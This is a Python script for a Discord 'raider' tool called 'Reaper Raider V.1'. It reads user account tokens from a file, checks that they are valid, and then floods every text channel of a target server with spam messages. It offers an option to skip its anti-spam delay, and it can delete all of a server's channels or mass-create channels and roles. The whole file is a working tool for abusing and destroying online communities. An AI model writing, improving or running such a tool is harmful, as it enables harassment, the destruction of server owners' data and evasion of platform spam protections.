import os
import requests
import asyncio

def validate_tokens(tokens):
    valid_tokens = []
    for token in tokens:
        url = 'https://discord.com/api/v9/users/@me'
        headers = {
            'Authorization': token.strip()
        }
        try:
            r = requests.get(url, headers=headers)
            if r.status_code == 200:
                valid_tokens.append(token)
            else:
                print(f"Token {token} is invalid.")
        except Exception as e:
            print(f"Error validating token {token}: {e}")
    return valid_tokens

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

art1 = """
\033[38;2;255;240;240m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢤⣶⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
\033[38;2;255;220;220m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⡾⠿⢿⡀⠀⠀⠀⠀⣠⣶⣿⣷⠀⠀⠀⠀
\033[38;2;255;200;200m⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣦⣴⣿⡋⠀⠀⠈⢳⡄⠀⢠⣾⣿⠁⠈⣿⡆⠀⠀⠀
\033[38;2;255;180;180m⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⠿⠛⠉⠉⠁⠀⠀⠀⠹⡄⣿⣿⣿⠀⠀⢹⡇⠀⠀⠀
\033[38;2;255;160;160m⠀⠀⠀⠀⠀⣠⣾⡿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⣰⣏⢻⣿⣿⡆⠀⠸⣿⠀⠀⠀
\033[38;2;255;140;140m⠀⠀⠀⢀⣴⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⣆⠹⣿⣷⠀⢘⣿⠀⠀⠀
\033[38;2;255;120;120m⠀⠀⢀⡾⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⣿⠋⠉⠛⠂⠹⠿⣲⣿⣿⣧⠀⠀
\033[38;2;255;100;100m⠀⢠⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣿⣿⣿⣷⣾⣿⡇⢀⠀⣼⣿⣿⣿⣧⠀
\033[38;2;255;80;80m⠰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⡘⢿⣿⣿⣿⠀
\033[38;2;255;60;60m⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⣷⡈⠿⢿⣿⡆
\033[38;2;255;40;40m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠛⠁⢙⠛⣿⣿⣿⣿⡟⠀⡿⠀⠀⢀⣿⡇
\033[38;2;255;20;20m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣶⣤⣉⣛⠻⠇⢠⣿⣾⣿⡄⢻⡇
\033[38;2;255;0;0m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣦⣤⣾⣿⣿⣿⣿⣆⠁
"""

art2 = """
\033[38;2;255;0;0m██████╗  ██████╗ ███╗   ██╗███╗   ██╗██╗   ██╗
██╔══██╗██╔═══██╗████╗  ██║████╗  ██║╚██╗ ██╔╝
██║  ██║██║   ██║██╔██╗ ██║██╔██╗ ██║ ╚████╔╝ 
██║  ██║██║   ██║██║╚██╗██║██║╚██╗██║  ╚██╔╝  
██████╔╝╚██████╔╝██║ ╚████║██║ ╚████║   ██║   
╚═════╝  ╚═════╝ ╚═╝  ╚═══╝╚═╝  ╚═══╝   ╚═╝
"""

# Print the arts
print(art1)
print(art2)


success_message = "Messages sent successfully."
invalid_token_message = "No valid tokens provided. Try again."
invalid_channel_message = "Invalid channel URL."
prompt_message = "Separate Tokens By Commas | Insert User Token(s): "

def read_tokens_from_file(file_path):
    try:
        with open(file_path, 'r') as file:
            tokens = file.readlines()
            tokens = [token.strip() for token in tokens]  # Loại bỏ dấu \n hoặc khoảng trắng dư thừa
        return tokens
    except Exception as e:
        print(f"Error reading tokens from file: {e}")
        return []

def get_all_channels(token, server_id):
    url = f"https://discord.com/api/v9/guilds/{server_id}/channels"
    headers = {
        'Authorization': token
    }
    try:
        r = requests.get(url, headers=headers)
        if r.status_code == 200:
            return [channel['id'] for channel in r.json() if channel['type'] == 0]
        else:
            print(f"Failed to retrieve channels: {r.status_code}")
            return []
    except Exception as e:
        print(f"Error retrieving channels: {e}")
        return []

async def send_message(token, channel_id, message, bypass_anti_spam=False):
    url = f'https://discord.com/api/v9/channels/{channel_id}/messages'
    headers = {
        'Authorization': token,
        'Content-Type': 'application/json'
    }
    payload = {'content': message}
    try:
        r = requests.post(url, json=payload, headers=headers)
        if r.status_code == 200:
            print(f"Token {token[:6]}...: Message sent to channel {channel_id}.")
        else:
            print(f"Token {token[:6]}...: Failed to send message to channel {channel_id}. Status code: {r.status_code}")
    except Exception as e:
        print(f"Token {token[:6]}...: Error sending message to channel {channel_id}: {e}")
    
    if not bypass_anti_spam:
        await asyncio.sleep(2)  # Delay to avoid anti-spam measures

async def send_messages(tokens, server_id, message, num_times, bypass_anti_spam):
    channel_ids = []
    for token in tokens:
        channel_ids += get_all_channels(token, server_id)
    
    if not channel_ids:
        print("No text channels found or failed to retrieve channels.")
        return
    
    tasks = []
    for _ in range(num_times):
        for channel_id in channel_ids:
            for token in tokens:
                tasks.append(send_message(token, channel_id, message, bypass_anti_spam))

    await asyncio.gather(*tasks)

def nuke_discord(tokens, server_id, message, num_times, bypass_anti_spam):
    try:
        loop = asyncio.get_event_loop()
        loop.run_until_complete(send_messages(tokens, server_id, message, num_times, bypass_anti_spam))
        print(success_message)
    except Exception as e:
        print(f"Error sending message: {e}")
    input("\nPress Enter to return to options...")

def delete_channels(tokens, server_id):
    for token in tokens:
        url = f"https://discord.com/api/v9/guilds/{server_id}/channels"
        headers = {
            'Authorization': token
        }
        try:
            r = requests.get(url, headers=headers)
            if r.status_code == 200:
                channels = r.json()
                for channel in channels:
                    channel_id = channel['id']
                    delete_url = f"https://discord.com/api/v9/channels/{channel_id}"
                    try:
                        delete_req = requests.delete(delete_url, headers=headers)
                        if delete_req.status_code == 204:
                            print(f"Deleted channel {channel_id} successfully.")
                        else:
                            print(f"Failed to delete channel {channel_id}. Status code: {delete_req.status_code}")
                    except Exception as e:
                        print(f"Error deleting channel {channel_id}: {e}")
            else:
                print(f"Failed to retrieve channels: {r.status_code}")
        except Exception as e:
            print(f"Error retrieving channels: {e}")

def mass_create_channels(tokens, server_id, channel_name, num_channels):
    for token in tokens:
        url = f"https://discord.com/api/v9/guilds/{server_id}/channels"
        headers = {
            'Authorization': token,
            'Content-Type': 'application/json'
        }
        for _ in range(num_channels):
            payload = {
                'name': channel_name,
                'type': 0  # Text channel type
            }
            try:
                r = requests.post(url, json=payload, headers=headers)
                if r.status_code == 201:
                    print(f"Created channel {channel_name} successfully.")
                else:
                    print(f"Failed to create channel {channel_name}. Status code: {r.status_code}")
            except Exception as e:
                print(f"Error creating channel {channel_name}: {e}")

def mass_create_roles(tokens, server_id, role_name, num_roles):
    for token in tokens:
        url = f"https://discord.com/api/v9/guilds/{server_id}/roles"
        headers = {
            'Authorization': token,
            'Content-Type': 'application/json'
        }
        for _ in range(num_roles):
            payload = {
                'name': role_name,
                'hoist': True,
                'mentionable': True
            }
            try:
                r = requests.post(url, json=payload, headers=headers)
                if r.status_code == 201:
                    print(f"Created role {role_name} successfully.")
                else:
                    print(f"Failed to create role {role_name}. Status code: {r.status_code}")
            except Exception as e:
                print(f"Error creating role {role_name}: {e}")

def show_options(tokens):
    while True:
        clear_screen()
        print("=== Welcome To Reaper Raider V.1 ===")
        print("            ")
        print(f"Loaded Token(s) [ {len(tokens)} ]\n")
        print("Options:")
        print("            ")
        print("| [1] Mass Spam             | [4] Mass Create Roles")
        print("|                           |")
        print("| [2] Mass Create Channels  | [5] Credits")
        print("|                           |")
        print("| [3] Mass Delete Channels  | [6] Return\n")
        choice = input("Choose an option: ").strip()
        if choice == "1":
            clear_screen()
            server_id = input("Server ID: ").strip()
            if server_id.isdigit():
                message = input("Spam Message: ")
                num_times = int(input("Amount: "))
                bypass_anti_spam = input("Bypass Anti-Spam [ y/n ]: ").strip().lower() == 'y'
                print("Sending...")
                nuke_discord(tokens, server_id, message, num_times, bypass_anti_spam)
            else:
                print("Invalid Server ID.")
                input("\nPress Enter to return to options...")
        elif choice == "2":
            clear_screen()
            server_id = input("Server ID: ").strip()
            if server_id.isdigit():
                channel_name = input("Channel Names: ").strip()
                num_channels = int(input("Amount: "))
                print("Creating channels...")
                mass_create_channels(tokens, server_id, channel_name, num_channels)
            else:
                print("Invalid Server ID.")
                input("\nPress Enter to return to options...")
        elif choice == "3":
            clear_screen()
            server_id = input("Server ID: ").strip()
            if server_id.isdigit():
                print("Deleting all channels in the server...")
                delete_channels(tokens, server_id)
            else:
                print("Invalid Server ID.")
                input("\nPress Enter to return to options...")
        elif choice == "4":
            clear_screen()
            server_id = input("Server ID: ").strip()
            if server_id.isdigit():
                role_name = input("Name Roles: ").strip()
                num_roles = int(input("Amount: "))
                print("Creating roles...")
                mass_create_roles(tokens, server_id, role_name, num_roles)
            else:
                print("Invalid Server ID.")
                input("\nPress Enter to return to options...")
        elif choice == "5":
            clear_screen()
            print(art2)
            print("\nCreated By F1nnit0\n")
            input("Press Enter to return to options...")
        elif choice == "6":
            clear_screen()
            break
        else:
            print("Invalid choice. Please try again.")
            input("Press Enter to return to options...")

def main():
    while True:
        clear_screen()
        print(art1)
        print(art2)

        # Đọc token từ file
        file_path = 'tokens.txt'  # Đường dẫn đến file chứa các token
        tokens = read_tokens_from_file(file_path)

        if tokens:
            print(f"Loaded {len(tokens)} token(s) from {file_path}")
            valid_tokens = validate_tokens(tokens)
            if valid_tokens:
                show_options(valid_tokens)
            else:
                clear_screen()
                print(invalid_token_message)
                input("Press Enter to try again...")
        else:
            print("No tokens found or error reading file. Please check the file.")
            input("Press Enter to try again...")

if __name__ == "__main__":
    main()
